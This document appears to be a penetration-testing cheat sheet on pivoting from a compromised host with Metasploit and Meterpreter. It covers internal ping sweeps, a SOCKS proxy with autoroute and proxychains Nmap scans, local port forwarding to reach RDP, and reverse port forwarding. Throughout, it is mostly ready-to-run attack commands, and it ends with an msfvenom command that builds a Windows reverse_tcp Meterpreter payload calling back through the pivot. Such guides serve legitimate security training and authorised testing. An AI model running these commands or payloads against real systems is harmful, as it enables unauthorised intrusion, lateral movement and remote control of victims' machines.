## Methodology

1. Access established on pivot host but need to probe internal network: **Internal Network Discovery**
2. ICMP is blocked or need to use external tools (e.g., Nmap) against internal range: **SOCKS Proxying & AutoRoute**
3. Need to reach a specific internal service (e.g., RDP, SMB) on a single target: **Local Port Forwarding**
4. Need an internal target to call back to a handler via the pivot: **Reverse Port Forwarding**

---

## Internal Network Discovery

**When to use** Pivot host is compromised and internal subnets are identified via local routing tables; requires ICMP to be allowed by internal firewalls.

**Commands** Native Meterpreter ping sweep for speed and integration

```
run post/multi/gather/ping_sweep RHOSTS=<TARGET_SUBNET>
```

Linux-native shell loop when Meterpreter modules are restricted

```
for i in {1..254} ;do (ping -c 1 <PIVOT_IP_PREFIX>.$i | grep "bytes from" &) ;done
```

Windows CMD loop for target discovery from a Windows pivot

```
for /L %i in (1 1 254) do ping <PIVOT_IP_PREFIX>.%i -n 1 -w 100 | find "Reply"
```

PowerShell loop for more granular discovery on modern Windows hosts

```
1..254 | % {"<PIVOT_IP_PREFIX>.$($): $(Test-Connection -count 1 -comp <PIVOT_IP_PREFIX>.$($) -quiet)"}
```

**Tool comparison**

- `post/multi/gather/ping_sweep` -> `run post/multi/gather/ping_sweep` -> prefer for automated integration into MSF database.
- OS-native loops -> `for` / `PowerShell` -> prefer when evasion or standard shell limitations prevent module execution.

**Gotchas** **ARP cache building** may cause the first sweep to miss active hosts; always run discovery twice. **ICMP filtering** will cause ping sweeps to return no results even if hosts are alive; move to TCP scanning.

## SOCKS Tunneling and Global Routing

**When to use** Internal firewalls block ICMP or complex tools like Nmap must be routed through the Meterpreter session to reach the internal subnet.

**Commands** Start the SOCKS proxy server within Metasploit

```
use auxiliary/server/socks_proxy
set SRVPORT <PORT>
set SRVHOST 0.0.0.0
set version 4a
run
```

Add the proxy to the local configuration file

```
socks4 127.0.0.1 <PORT>
```

Route internal traffic through the active session via post-exploitation module

```
use post/multi/manage/autoroute
set SESSION <SESSION_ID>
set SUBNET <TARGET_SUBNET>
run
```

Alternative routing directly from the Meterpreter shell

```
run autoroute -s <TARGET_SUBNET>
```

Execute external tools through the established tunnel

```
proxychains nmap <TARGET_IP> -p<PORT> -sT -v -Pn
```

**Tool comparison**

- `post/multi/manage/autoroute` -> `set SESSION` -> prefer for clean management and compatibility checks.
- `run autoroute` -> `meterpreter > run autoroute` -> prefer for speed while already in a shell, though **scripts are deprecated**.

**Edge cases**

- SOCKS version mismatch: If the server is set to version 5, the proxychains configuration must be updated from `socks4` to `socks5`.

**Gotchas** **Incompatible session platform** errors may occur when running autoroute against Linux hosts, but the route may still successfully add to the MSF routing table. **Connect scan requirement**: Nmap must use `-sT` when running through proxychains as raw socket scans (`-sS`) are not supported over SOCKS.

## Local Port Forwarding

**When to use** Direct access to a specific port on an internal host is required for tools that do not support SOCKS (e.g., RDP clients).

**Commands** Create a relay from the attack host to the internal target

```
portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
```

Verify the local listener is active

```
netstat -antp
```

Connect to the internal service via the local relay

```
xfreerdp /v:localhost:<LOCAL_PORT> /u:<USERNAME> /p:<PASSWORD>
```

**Gotchas** **Port conflicts** on the attack host will prevent the relay from starting; ensure `<LOCAL_PORT>` is not already in use.

## Reverse Port Forwarding

**When to use** An internal target needs to initiate a connection (like a reverse shell) back to the attack host via a pivot that it can reach, but which the attack host cannot reach directly.

**Commands** Configure the pivot to forward incoming connections to the attack host

```
portfwd add -R -l <ATTACK_HANDLER_PORT> -p <PIVOT_LISTENER_PORT> -L <ATTACK_IP>
```

Generate a payload that points to the pivot host and the designated pivot port

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOT_IP> LPORT=<PIVOT_LISTENER_PORT> -f exe -o <FILE_PATH>
```

**Gotchas** **Payload configuration error**: If `LHOST` in the payload is set to the attack IP instead of the pivot IP, the target will fail to connect because it cannot see the attack host.